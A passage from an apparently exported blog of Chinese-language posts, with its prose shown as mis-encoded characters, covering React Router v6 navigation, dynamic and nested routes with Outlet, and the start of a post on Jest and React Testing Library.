'react-router-dom'const About: React.FC = () =&gt; { // è¨˜å¾—æ˜¯æ‹¿ call å®Œå¾Œçš„æ±è¥¿ä¾†ç”¨ï¼Œä¸æ˜¯ç›´æ¥ useNavigate(\"/\") const navigate = useNavigate() return ( &lt;div&gt; About page &lt;button onClick={() =&gt; navigate('/')}&gt;Go back to home page&lt;/button&gt; &lt;/div&gt; )}export default About å‹•æ…‹è·¯ç”±èˆ‰ä¸€å€‹å¸¸è¦‹çš„ä¾‹å­ï¼Œå¦‚æœä½ æƒ³é€ è¨ªæŸå€‹äººçš„ profileï¼Œé‚£ç¶²å€ä¸€å®šæ˜¯é•·æˆé€™æ¨£ï¼š https://aaa.com/profile/peanu https://aaa.com/profile/ppb https://aaa.com/profile/huli çµæ§‹éƒ½æ˜¯ä»¥ /profile/åç¨± ä¾†çµ„æˆï¼Œå¯æ˜¯å› ç‚ºåç¨±ä¸æ˜¯å›ºå®šçš„å€¼ï¼Œæ‰€ä»¥æ‰æœƒèªªé€™æ˜¯ã€Œå‹•æ…‹ã€çš„ã€‚ å¯¦ç¾çš„æ–¹å¼ä¹Ÿä¸é›£ï¼Œç›´æ¥ä¾†çœ‹ codeã€‚ é¦–å…ˆå…ˆèª¿æ•´ä¸€ä¸‹è·¯ç”±çš„éƒ¨åˆ†ï¼š 123456789101112131415161718192021222324import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import ErrorPage from './pages/ErrorPage'import Home from './pages/Home'import Profile from './pages/Profile'import Nav from './pages/Nav'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; {/* å¾Œé¢æ¥ /:params */} &lt;Route path='/profile/:username' element={&lt;Profile /&gt;} /&gt; &lt;Route path='*' element={&lt;ErrorPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App åªè¦åŠ ä¸Š : å°±ä»£è¡¨é€™æ˜¯å‹•æ…‹çš„å€¼ï¼Œä¸¦ä¸”æœƒç”¨ä¸€å€‹è®Šæ•¸çš„æ–¹å¼ä¾†ä»£è¡¨é€™å€‹å€¼ã€‚ æ¥è‘—åˆ° &lt;Profile /&gt; çš„éƒ¨åˆ†åšé»èª¿æ•´ï¼Œé€™é‚Šæœƒç”¨åˆ° useParams é€™å€‹ hookã€‚ å®ƒçš„ç”¨é€”å°±æ˜¯è®“æˆ‘å€‘å–å¾—å‹•æ…‹è·¯ç”±çš„å…§å®¹ï¼Œç°¡å–®ä¾†èªªï¼Œå¦‚æœç¶²å€æ˜¯ /profile/peanuï¼Œå›å‚³å€¼å°±æœƒæ˜¯ { username: \"peanu\" }ï¼Œä»¥æ­¤é¡æ¨ã€‚ 12345678910import React from 'react'import { useParams } from 'react-router-dom'const Profile: React.FC = () =&gt; { const { username } = useParams() return &lt;div&gt;Hi, This is {username}'s Profile page&lt;/div&gt;}export default Profile èª¿æ•´å®Œä»¥å¾Œï¼Œç¾åœ¨åˆ° /profile/paenu æ™‚çµæœå°±æœƒæ˜¯ Hi, This is peanu's Profile pageï¼Œå…¶ä»–ä¹Ÿæ˜¯ä»¥æ­¤é¡æ¨ã€‚ åŠ å…¥å‹•æ…‹è·¯ç”±çš„åŠŸèƒ½å¾Œï¼Œå°±å¯ä»¥æ ¹æ“šè·¯ç”±çš„å€¼ä¾†æ±ºå®šè¦å‘ˆç¾ä»€éº¼å…§å®¹ï¼Œæ˜¯éå¸¸å¯¦ç”¨çš„åŠŸèƒ½ã€‚ å¥½ï¼Œåˆ°é€™é‚Šå…ˆä¸­å ´ä¼‘æ¯ã€‚ç­‰ä¸€ä¸‹æœƒä»‹ç´¹æˆ‘è¦ºå¾—æ¯”è¼ƒè¤‡é›œçš„æ±è¥¿ï¼šå·¢ç‹€è·¯ç”± å¦å¤–æœ‰éœ€è¦åŸå§‹ç¢¼çš„è©±å¯ä»¥åƒè€ƒé€™è£¡ã€‚ å·¢ç‹€è·¯ç”±é€™é‚Šæœƒç”¨åº•ä¸‹çš„ç¯„ä¾‹ä¾†è§£èªªï¼š 12345678910111213141516171819202122import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import User from './pages/User'import Nav from './pages/Nav'import Home from './pages/Home'import NoMatch from './pages/Nomatch'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route index element={&lt;Home /&gt;} /&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; &lt;Route path='user' element={&lt;User /&gt;} /&gt; &lt;Route path='*' element={&lt;NoMatch /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App æˆ‘å€‘å¸Œæœ› /user åº•ä¸‹æœ‰ /user/profile è·Ÿ /user/account é€™å…©å€‹é é¢ï¼Œåƒé€™æ¨£ï¼š é¦–å…ˆå…ˆåˆ° &lt;User /&gt; ä¸­å»ºç«‹ç”¨ä¾†è·³è½‰çš„é€£çµï¼š 1234567891011121314151617181920import React from 'react'import { Link } from 'react-router-dom'const User: React.FC = () =&gt; { return ( &lt;div className='container'&gt; &lt;h2&gt;User: PeaNu&lt;/h2&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to='profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='account'&gt;Account&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; )}export default User è·¯å¾‘çš„éƒ¨åˆ†å¯ä»¥å¯«æˆç›¸å°è·¯å¾‘æˆ–çµ•å°è·¯å¾‘ï¼š /user/profileï¼ˆçµ•å°ï¼‰ profileï¼ˆç›¸å°ï¼‰ ä½†è«‹åˆ¥å¯«æˆ /profileï¼Œå› ç‚ºç”¨ / ä¾†é–‹é ­å°±æœƒè¢«ç•¶æˆçµ•å°è·¯å¾‘ï¼Œæ‰€ä»¥æœƒè·³åˆ° https://aaa.com/profile é€™å€‹ä½ç½®ã€‚ åšåˆ°é€™é‚Šä»¥å¾Œï¼Œé»äº†é€£æ¥æ‡‰è©²æœƒè·³åˆ° 404 é é¢ï¼Œé€™æ˜¯å› ç‚ºæˆ‘å€‘é‚„æ²’æœ‰å»è¨­å®šè·¯ç”±ï¼Œè®“ React çŸ¥é“ /user/profile è¦é¡¯ç¤ºå“ªå€‹ Componentï¼Œæ‰€ä»¥æ¥è‘—ä¾†å°é€™éƒ¨åˆ†åšè¨­å®šï¼š 12345678910111213141516171819202122232425262728import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import User from './pages/User'import Nav from './pages/Nav'import Home from './pages/Home'import NoMatch from './pages/Nomatch'import Profile from './pages/Profile'import Account from './pages/Account'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route index element={&lt;Home /&gt;} /&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; &lt;Route path='user' element={&lt;User /&gt;}&gt; {/* å› ç‚ºæ˜¯å·¢ç‹€ï¼Œæ‰€ä»¥å¾—åŒ…åœ¨ user çš„ Route è£¡é¢ */} &lt;Route path='profile' element={&lt;Profile /&gt;}&gt;&lt;/Route&gt; &lt;Route path='account' element={&lt;Account /&gt;}&gt;&lt;/Route&gt; &lt;/Route&gt; &lt;Route path='*' element={&lt;NoMatch /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App é™„è¨»ï¼šé—œæ–¼ &lt;Profile /&gt; å’Œ &lt;Account /&gt; é€™å…©å€‹å…ƒä»¶å°±éº»ç…©ä½ è‡ªå·±å»å»ºç«‹ä¸€ä¸‹ï¼Œé€™é‚Šå°±ä¸è²¼å‡ºä¾†ä½”ç‰ˆé¢äº†ã€‚ åšåˆ°é€™ä»¥å¾Œçœ‹èµ·ä¾†å¥½åƒå°±å·®ä¸å¤šäº†ï¼Ÿä½†å…¶å¯¦é‚„æ²’æœ‰ï¼Œç›®å‰é»é€£çµå¾Œæœƒç™¼ç¾ç¶²å€ç¢ºå¯¦æœƒè®Šæˆ /user/profileï¼Œå¯æ˜¯ä¸¦ä¸æœƒé¡¯ç¤º &lt;Profile /&gt; çš„å…§å®¹ã€‚ é€™æ˜¯å› ç‚ºæˆ‘å€‘æ¼æ‰äº† Outlet é€™å€‹æ±è¥¿ã€‚ 12345678910111213141516171819202122import React from 'react'import { Link, Outlet } from 'react-router-dom'const User: React.FC = () =&gt; { return ( &lt;div className='container'&gt; &lt;h2&gt;User: PeaNu&lt;/h2&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to='profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='account'&gt;Account&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; {/* åŠ ä¸Š Outlet */} &lt;Outlet /&gt; &lt;/div&gt; )}export default User Outlet æ˜¯è² è²¬æŠŠåŒ¹é…çš„å­è·¯ç”±çµ¦é¡¯ç¤ºå‡ºä¾†çš„ Componentï¼Œé€™é‚Šå› ç‚º Outlet æ˜¯æ”¾åœ¨ User ä¸­ï¼Œæ‰€ä»¥æœƒæ ¹æ“šå‰›å‰›å¯«çš„è·¯ç”±ä¾†åŒ¹é… profile å’Œ account é€™å…©å€‹è·¯å¾‘ã€‚ é †é“ä¸€æï¼Œå¦‚æœä½ æƒ³é¿å… /user/profile/xxxx çš„æ™‚å€™è·³è½‰åˆ° 404ï¼Œä½ å¯ä»¥é€é * ä¾†è™•ç†ï¼š 12345678910111213&lt;router&gt; &lt;nav /&gt; &lt;routes&gt; &lt;route index element={&lt;Home /&gt;} /&gt; &lt;route path='home' element={&lt;Home /&gt;} /&gt; &lt;route path='user' element={&lt;User /&gt;}&gt; {/* åŠ ä¸Š * è™Ÿ */} &lt;route path='profile/*' element={&lt;Profile /&gt;}&gt;&lt;/route&gt; &lt;route path='account/*' element={&lt;Account /&gt;}&gt;&lt;/route&gt; &lt;/route&gt; &lt;route path='*' element={&lt;Nomatch /&gt;} /&gt; &lt;/routes&gt;&lt;router&gt; OKï¼Œä»¥ä¸Šå°±æ˜¯å·¢ç‹€è·¯ç”±çš„æ•™å­¸ï¼Œå¦‚æœæƒ³åƒè€ƒåŸå§‹ç¢¼çš„è©±å¯ä»¥åˆ°é€™é‚Šä¾†çœ‹ã€‚ å¦ä¸€ç¨®å·¢ç‹€çµæ§‹çš„æ€ç¶­å‰›å‰›ä»‹ç´¹çš„å·¢ç‹€çµæ§‹ï¼Œå¯¦éš›åœ¨ä½¿ç”¨æ™‚çœ‹èµ·ä¾†æ˜¯åƒé€™æ¨£ï¼š å¯æ˜¯å¦‚æœæˆ‘å¸Œæœ›é»ä¸‹ profile æ™‚ï¼Œæ˜¯è·³è½‰åˆ°ä¸€å€‹å…¨æ–°çš„é é¢ï¼Œè€Œä¸æ˜¯åƒä¸Šé¢é‚£æ¨£ä¿ç•™å°è¦½åˆ—çš„æƒ…å¢ƒå‘¢ï¼Ÿåƒé€™æ¨£ï¼š é€™æ™‚å€™å°±è¦ç”¨æ¯”è¼ƒ tricky çš„ä½œæ³•äº†ï¼ˆä¹Ÿæœ‰äººèªªæ˜¯å¯« App çš„æ€ç¶­ï¼‰ã€‚ é¦–å…ˆè¦å…ˆå›æ†¶ä¸€ä¸‹ Outlet é€™å€‹ Component çš„ç”¨é€”ï¼Œå®ƒçš„ç”¨é€”æ˜¯æŠŠã€Œå°æ‡‰çš„å­è·¯ç”±é¡¯ç¤ºå‡ºä¾†ã€ï¼Œè€Œå‰›å‰›æˆ‘å€‘æ˜¯æŠŠå®ƒå¯«åœ¨ &lt;User /&gt; è£¡é¢ï¼š 12345678910111213141516171819202122import React from 'react'import { Link, Outlet } from 'react-router-dom'const User: React.FC = () =&gt; { return ( &lt;div className='container'&gt; &lt;h2&gt;User: PeaNu&lt;/h2&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to='profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='account'&gt;Account&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; {/* å¯«åœ¨é€™è£¡ */} &lt;Outlet /&gt; &lt;/div&gt; )}export default User æ‰€ä»¥ç•¶æˆ‘å€‘åœ¨é€ è¨ª /user/profile çš„æ™‚å€™å°±æœƒæŠŠå°æ‡‰çš„ Component é¡¯ç¤ºåˆ° &lt;Outlet /&gt; è£¡é¢ã€‚ä¹Ÿå°±æ˜¯èªªä¸ç®¡æˆ‘å€‘æ€éº¼åˆ‡æ›è·¯ç”±ï¼Œå°è¦½åˆ—çš„å…§å®¹æœƒæ°¸é æ“ºåœ¨ &lt;Outlte /&gt; ä¸Šé¢ã€‚ æ—¢ç„¶å¦‚æ­¤ï¼Œæˆ‘å€‘å°±ä¸èƒ½æŠŠ &lt;Outlet /&gt; æ”¾åœ¨ &lt;User /&gt; ä¸­ï¼Œå¯æ˜¯é€™æ¨£çš„è©±è¦æ”¾åœ¨å“ªè£¡ï¼Ÿ å…¶å¯¦ç­”æ¡ˆå¯èƒ½æ²’æœ‰ä½ æƒ³åƒä¸­çš„è¤‡é›œï¼Œå…ˆä¾†çœ‹ code å§ï¼š 123456789101112131415161718192021222324252627282930import React from 'react'import { HashRouter as Router, Routes, Route, Outlet } from 'react-router-dom'import User from './pages/User'import Nav from './pages/Nav'import Home from './pages/Home'import NoMatch from './pages/Nomatch'import Profile from './pages/Profile'import Account from './pages/Account'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route index element={&lt;Home /&gt;} /&gt; &lt;Route path='home' element={&lt;Home /&gt;} /&gt; {/* æ”¾åœ¨é€™è£¡ */} &lt;Route path='user' element={&lt;Outlet /&gt;}&gt; {/* é€™å€‹çš„æ„æ€å°±æ˜¯ /user æ™‚é¡¯ç¤º &lt;User /&gt; */} &lt;Route path='' element={&lt;User /&gt;} /&gt; &lt;Route path='profile/*' element={&lt;Profile /&gt;}&gt;&lt;/Route&gt; &lt;Route path='account/*' element={&lt;Account /&gt;}&gt;&lt;/Route&gt; &lt;/Route&gt; &lt;Route path='*' element={&lt;NoMatch /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App æˆ‘å€‘æŠŠ &lt;Outlet/&gt; ç›´æ¥æ”¾åˆ° /user çš„ &lt;Route&gt; ä¸Šï¼Œæ„æ€å°±æœƒæ˜¯ã€Œè«‹é¡¯ç¤º /user çš„å­è·¯ç”±ã€ã€‚æ¥è‘—æˆ‘å€‘åˆæ–°å¢äº†ä¸€å€‹ path=\"\" çš„å­è·¯ç”±ï¼Œé€™æ˜¯ä»€éº¼æ„æ€ï¼Ÿ æ„æ€æ˜¯ç•¶æˆ‘åœ¨ /user é€™å€‹é é¢æ™‚ï¼ŒæœƒåŒ¹é…åˆ° /user\"\" é€™å€‹å­è·¯ç”±ï¼Œç„¶å¾Œé¡¯ç¤º &lt;User /&gt;ã€‚ï¼ˆæœ‰é»é¥’å£ï¼Œä½ å¯èƒ½è¦å¤šçœ‹å¹¾æ¬¡æœƒæ¯”è¼ƒå¥½ç†è§£ï¼‰ æ‰€ä»¥ç¶“éé€™æ¨£è¨­è¨ˆå¾Œï¼Œå°±å¯ä»¥å¯¦ç¾åœ¨ /user/profile çš„æ™‚å€™ä¸æœƒå‡ºç¾å°è¦½åˆ—ï¼Œåªæœƒæœ‰ &lt;Profile /&gt; çš„å…§å®¹ã€‚ ç¸½ä¹‹é€™é‚Šåªæ˜¯æƒ³ä»‹ç´¹ä¸€ä¸‹é€™ç¨®åšæ³•ï¼Œæˆ‘å°é€™ç¨®å·¢ç‹€è·¯ç”±çš„æ“ä½œé‚„è »é™Œç”Ÿçš„ï¼Œæ‰€ä»¥æ‰ç‰¹åˆ¥è¨˜éŒ„ä¸‹ä¾†ã€‚ é€™é‚Šä¹Ÿé™„ä¸ŠåŸå§‹ç¢¼ï¼Œæœ‰éœ€è¦éƒ½å¯ä»¥å»çœ‹çœ‹ã€‚ å·¢ç‹€çµæ§‹çš„å„ªåŒ–å‡è¨­æˆ‘æœ‰ä¸€å€‹ç®¡ç†ç³»çµ±çš„ç¶²é ï¼Œè·¯ç”±çµæ§‹å¦‚ä¸‹ï¼š /system /system/groupA /system/groupA /ststem/groupA/add /system/groupA/:groupCode ç„¶å¾Œ group å¯èƒ½æœ‰å¾ˆå¤šå€‹ï¼Œä¾‹å¦‚ Aã€Bã€C ç­‰ç­‰ï¼Œé‚£æˆ‘å¯èƒ½å°±æœƒé€™æ¨£è¨­è¨ˆï¼š 1234567891011121314151617181920212223242526272829&lt;Router&gt; &lt;Routes&gt; {/* /system */} &lt;Route path='system' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;SystemWelcom /&gt;} /&gt; {/* /system/groupA */} &lt;Route path='groupA' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;GroupAList /&gt;} /&gt; &lt;Route path=':groupCode/*' element={&lt;GroupALDetail /&gt;} /&gt; &lt;Route path='add/*' element={&lt;GroupAAdd /&gt;} /&gt; &lt;Route path='*' element={&lt;GroupAList /&gt;} /&gt; &lt;/Route&gt; {/* /system/groupB */} &lt;Route path='groupB' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;GroupBList /&gt;} /&gt; &lt;Route path=':groupCode/*' element={&lt;GroupBLDetail /&gt;} /&gt; &lt;Route path='add/*' element={&lt;GroupBAdd /&gt;} /&gt; &lt;Route path='*' element={&lt;GroupBList /&gt;} /&gt; &lt;/Route&gt; {/* /system/groupC */} &lt;Route path='groupC' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;GroupCList /&gt;} /&gt; &lt;Route path=':groupCode/*' element={&lt;GroupCLDetail /&gt;} /&gt; &lt;Route path='add/*' element={&lt;GroupCAdd /&gt;} /&gt; &lt;Route path='*' element={&lt;GroupCList /&gt;} /&gt; &lt;/Route&gt; &lt;/Route&gt; &lt;/Routes&gt;&lt;/Router&gt; é™„è¨»ï¼šå¦‚æœé€™æ¨£çœ‹æœ‰é»æŠ½è±¡çš„è©±ï¼Œæˆ‘æœ‰å¯«ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œå¯ä»¥åˆ°é€™é‚Šåƒè€ƒã€‚ é›–ç„¶é€™æ¨£å­å¯«æ²’ä»€éº¼å•é¡Œï¼Œä½†å…¶å¯¦åˆ©ç”¨ä¸‹é¢é€™ç¨®æŠ€å·§å¯ä»¥å¯«æ›´ç°¡æ½”ï¼š 12345678910&lt;Router&gt; &lt;Routes&gt; &lt;Route path='system' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;SystemWelcom /&gt;} /&gt; &lt;Route path='groupA/*' element={&lt;GroupA /&gt;} /&gt; &lt;Route path='groupB/*' element={&lt;GroupB /&gt;} /&gt; &lt;Route path='groupC/*' element={&lt;GroupC /&gt;} /&gt; &lt;/Route&gt; &lt;/Routes&gt;&lt;/Router&gt; é€™é‚Šçš„æŠ€å·§åœ¨æ–¼ï¼š groupA/* å¾Œé¢çš„ /* groupA/* å¾Œé¢çš„ /* groupA/* å¾Œé¢çš„ /* å› ç‚ºæˆ‘ç ”ç©¶äº†è »ä¹…æ‰ç™¼ç¾ï¼Œæ‰€ä»¥å¤šèªªå¹¾æ¬¡ï¼ˆX ä½ å¯èƒ½æœƒæƒ³èªªç”¨ /groupA ä¸è¡Œå—ï¼Ÿç‚ºä»€éº¼è¦ /groupA/*ï¼Ÿ çµ•å°ä¸è¡Œ é€™æ˜¯å› ç‚º /groupA çš„æ„æ€æ˜¯ã€Œè·¯å¾‘å¿…é ˆæ˜¯ä¸€å­—ä¸å·®çš„ /groupA æ‰ç®—åŒ¹é…ã€ï¼Œæ‰€ä»¥ç•¶ç¶²å€ /groupA/add æˆ– /groupA/list æ™‚ï¼Œéƒ½æœƒè¢«ç•¶ä½œä¸åŒ¹é…ï¼Œä¹Ÿå°±ä¸æœƒé¡¯ç¤º &lt;GroupA /&gt; é€™å€‹å…ƒä»¶ã€‚ ä½† /groupA/* å°±ä¸ä¸€æ¨£äº†ï¼Œ/* çš„æ„æ€æ˜¯å¾Œé¢æ¥ä»€éº¼éƒ½å¯ä»¥ï¼Œæ‰€ä»¥ä½ è¦ /groupA/123 é‚„æ˜¯ /groupA/321 éƒ½ç„¡æ‰€è¬‚ï¼Œå…¨éƒ¨éƒ½æœƒåŒ¹é…æˆåŠŸï¼Œé€™å€‹å°±æ˜¯æˆ‘å€‘è¦çš„æ•ˆæœã€‚ æœ€å¾Œï¼Œä½ å¯èƒ½æœƒå¥½å¥‡ &lt;groupA /&gt; æ˜¯ä»€éº¼æ±è¥¿ï¼Ÿé€™é‚Šå°±é †ä¾¿èªªä¸€ä¸‹ã€‚ é€™é‚Šæ˜¯åˆ©ç”¨é€™æ¨£çš„è³‡æ–™å¤¾çµæ§‹ï¼š GroupA List.tsx Detail.tsx Add.tsx index.tsx çœ‹åˆ° index çš„ç¬¬ä¸€çœ¼æ‡‰è©²å°±èƒ½çŒœåˆ°ä¸€ä»¶äº‹ï¼Œå°±æ˜¯åªè¦çœ‹é€™æ”¯æª”æ¡ˆå°±èƒ½çŸ¥é“é€™åœ¨å¹¹å˜›äº†ï¼Œæ‰€ä»¥æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ï¼š 1234567891011121314151617import React from 'react'import { Routes, Route } from 'react-router-dom'import List from './List'import Detail from './Detail'import Add from './Add'const GroupA: React.FC = () =&gt; { return ( &lt;Routes&gt; &lt;Route path='' element={&lt;List /&gt;} /&gt; &lt;Route path='add' element={&lt;Add /&gt;} /&gt; &lt;Route path=':groupCode' element={&lt;Detail /&gt;} /&gt; &lt;/Routes&gt; )}export default GroupA å°±æ˜¯æŠŠå°æ‡‰çš„å­è·¯ç”±å’Œå…ƒä»¶å¼•å…¥å¾Œåœ¨è¼¸å‡ºè€Œå·²ï¼Œæ²’æœ‰ä½ æƒ³çš„é‚£éº¼è¤‡é›œã€‚ å¥½å•¦ï¼Œå…¶å¯¦æ˜¯æˆ‘è¦ºå¾—è¦è§£é‡‹å¾ˆè©³ç´°çš„è©±æœƒèŠ±å¾ˆå¤šæ™‚é–“ï¼Œæ‰€ä»¥å¦‚æœçœŸçš„æƒ³ç ”ç©¶çš„è©±ï¼Œå»ºè­°åˆ°é€™é‚Šçœ‹åŸå§‹ç¢¼æ¯”è¼ƒå¿«ã€‚ ä¸€å€‹ç•¶åˆè¸©åˆ°çš„é›·å¦‚æœä¸€å€‹ Component æœ‰ç”¨åˆ° &lt;Link /&gt; æˆ–æ˜¯ useNavigate ä¹‹é¡çš„æ±è¥¿çš„è©±ï¼Œé‚£å®ƒä¸€å®šè¦æ”¾åœ¨ &lt;Router /&gt; è£¡é¢ï¼Œä¸ç„¶å°±æœƒå™´é€™å€‹éŒ¯èª¤ï¼š ç•¶åˆè¢«é€™å€‹é›·å¡å¾ˆä¹…ï¼Œæƒ³èªªæˆ‘æ ¹æœ¬æ²’ç”¨åˆ° useHref é€™å€‹ hook é˜¿ï¼ŒçœŸæ˜¯çš„ QQã€‚ è©³ç´°å¯ä»¥åƒè€ƒé€™è£¡ï¼šhttps://stackoverflow.com/questions/70220413/error-usehref-may-be-used-only-in-the-context-of-a-router-component-it-wor åƒè€ƒè³‡æ–™ React Router 6: Nested Routes React Router V6 Tutorial - Routes, Redirecting, UseNavigate, UseParamsâ€¦","link":"/2022/05/13/react-router-dom-review/"},{"title":"Reactï¼Testing","text":"ä»¥å‰ç¸½èªç‚ºå¯«æ¸¬è©¦å¾ˆéº»ç…©ï¼Œæœ€è¿‘æ‰æ…¢æ…¢é«”æœƒåˆ°æ¸¬è©¦æ˜¯ä¸€é …å¾ˆé‡è¦çš„æŠ€èƒ½ã€‚ é—œæ–¼ Jest èˆ‡ React Testing LibraryJestä¸€å€‹ç”¨ä¾†åŸ·è¡Œæ¸¬è©¦çš„ Runnerï¼Œå®ƒèƒ½å¤ è‡ªå‹•æ‰¾å‡ºè©²è¢«æ¸¬è©¦çš„æª”æ¡ˆä¸¦åŸ·è¡Œæ¸¬è©¦ï¼Œä¸¦æŠŠæ¸¬è©¦çµæœè½‰æ›æˆå¥½é–±è®€çš„çµæœã€‚ React Testing Library (RTL)è®“ JavaScript å¯ä»¥é€é Virtual DOM çš„æ–¹å¼ä¾†æ¸¬è©¦ React Componentã€‚ Testing Library å…¶å¯¦æ˜¯ä¸€å¥—é›†çµå„ç¨® UI å…ƒä»¶çš„æ¸¬è©¦åº«ï¼Œæ‰€ä»¥ React åªæ˜¯é€™å€‹å®¶æ—ä¸­çš„å…¶ä¸­ä¸€å€‹é …ç›®ã€‚ èƒŒå¾Œé‹ä½œçš„æ ¸å¿ƒæ˜¯ã€ŒDOM Testing Libraryã€ï¼Œè€Œ RTL åªæ˜¯æŠŠé€™äº›æ±è¥¿åŒ…è£èµ·ä¾†è®“æˆ‘å€‘ä½¿ç”¨èµ·ä¾†æ›´æ–¹ä¾¿ä¸€é»ã€‚ å„ç¨®æ¸¬è©¦å¥—ä»¶ @testing-library/jest-dom @testing-library/react @testing-library/user-event å¦‚æœæ˜¯ç”¨ CRA ä¾†å»ºç«‹å°ˆæ¡ˆçš„äººï¼ŒCRA æœƒåœ¨å»ºç«‹æ™‚è‡ªå‹•å®‰è£å¥½é€™äº›å¥—ä»¶å’Œè¨­å®šï¼Œä¸éœ€è¦é¡å¤–è™•ç†å°±èƒ½é–‹å§‹å¯«æ¸¬è©¦å›‰ã€‚ setupTests.tså¦‚æœæ˜¯ç”¨ CRA å»ºç«‹ç’°å¢ƒçš„è©±æ‡‰è©²èƒ½åœ¨æ ¹ç›®éŒ„çœ‹åˆ°é€™å€‹æª”æ¡ˆï¼Œå…§å®¹æ˜¯é€™æ¨£ï¼š 12345// jest-dom adds custom jest matchers for asserting on DOM nodes.// allows you to do things like:// expect(element).toHaveTextContent(/react/i)// learn more: https://github.com/testing-library/jest-domimport '@testing-library/jest-dom' ä»¥ CRA çš„ä¾‹å­ä¾†èªªæ˜¯ç”¨ä¾†æŠŠ jest-dom æä¾›çš„ matcher çµ¦å¼•å…¥åˆ° jestï¼Œè®“æˆ‘å€‘å¯«æ¸¬è©¦çš„èƒ½å¤ æ™‚ä½¿ç”¨é‚£äº›é¡å¤–çš„ matcherã€‚ åŸç†çš„è©±å¾ˆç°¡å–®ï¼Œå°±æ˜¯åœ¨ jest åŸ·è¡Œä»¥å‰æœƒå…ˆåŸ·è¡Œ setupTests.ts çš„å…§å®¹ï¼Œæ‰€ä»¥ jest è‡ªç„¶å¯ä»¥çœ‹æ‡‚é‚£äº›é¡å¤–çš„ matcherã€‚ Jest watch modeCRA é è¨­é–‹å•Ÿ watch modeï¼Œwatch mode çš„ç”¨é€”æ˜¯åŸ·è¡Œ test æ™‚åªæœƒå°ä¸Šæ¬¡ commit å¾Œæœ‰è¢«ä¿®æ”¹çš„æª”æ¡ˆåšæ¸¬è©¦ï¼Œé¿å…èŠ±å¾ˆå¤šæ™‚é–“è·‘ä¸ç›¸é—œçš„æ¸¬è©¦ã€‚ Filename Conventionä»¥ Jest ä¾†èªªçš„è©±æœƒåˆ†æˆåº•ä¸‹å¹¾å€‹ï¼š .test.jsï¼ˆæª”æ¡ˆï¼‰ .spec.jsï¼ˆæª”æ¡ˆï¼‰ __tess__ï¼ˆè³‡æ–™å¤¾ï¼‰ æ¯”è¼ƒå¸¸è¦‹çš„åšæ³•æ˜¯æŠŠæ¸¬è©¦æª”æ¡ˆæ”¾åœ¨åŸæª”æ¡ˆçš„éš”å£ï¼Œé€™æ¨£å°±å¯ä»¥ç”¨æœ€çŸ­çš„ import è·¯å¾‘ä¾†å¼•å…¥ï¼Œè¦æ‰¾æ¸¬è©¦æª”æ¡ˆçš„æ™‚å€™ä¹Ÿæ¯”è¼ƒå¥½æ‰¾ã€‚ åŸºæœ¬çµæ§‹ä¸€å€‹ Test æœƒåŒ…å«ä¸‰å€‹è¦ç´ ï¼š Arrangeï¼ˆä½ˆç½®ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯æŠŠ component æ¸²æŸ“å‡ºä¾†ï¼‰ Actionï¼ˆå‹•ä½œï¼‰ Assertion / Expectï¼ˆæ–·è¨€ï¼‰ ç¯„ä¾‹ï¼š 123456789test('if user inputted amount and note fields, the buttons become enabled. ', async () =&gt; { // æ¸²æŸ“ TransactionCreateStepTwo é€™å€‹ component render(&lt;TransactionCreateStepTwo sender={{ id: '5' }} receiver={{ id: '6' }} /&gt;) // ä½¿ç”¨è€…è¼¸å…¥åœ¨è¡¨å–®ä¸­è¼¸å…¥å…§å®¹ userEvent.type(screen.getByPlaceholderText(/amount/i), '50') userEvent.type(screen.getByPlaceholderText(/add a note/i), 'This is good for you.') // æœ€å¾Œæ‡‰è©²ç”¢ç”Ÿä»€éº¼çµæœï¼ˆè®Šæˆ Enabledï¼‰ expect(await screen.findByRole('button', { name: /pay/i })).toBeEnabled()}) é€™æ®µæ¸¬è©¦æ˜¯ç•¶ä½¿ç”¨è€…è¼¸å…¥å¿…å¡«æ¬„ä½å¾Œï¼Œæäº¤æŒ‰éˆ•æ‡‰è©²è¦è¢« enabledã€‚ Jest matcherç•¶æˆ‘å€‘ç”¨ expect(...) å»ºç«‹ä¸€å€‹ Assertion æ™‚ï¼Œéƒ½æœƒæ­é…ä¸€å€‹ã€Œmatcherã€ä¾†æ±ºå®šæˆ‘å€‘ Assertion æ˜¯å¦æ­£ç¢ºï¼Œèˆ‰ä¾‹ä¾†èªªï¼š 1expect(element).toHaveTextContent('abc') é€™æ˜¯ç”¨ä¾†æª¢æŸ¥ element 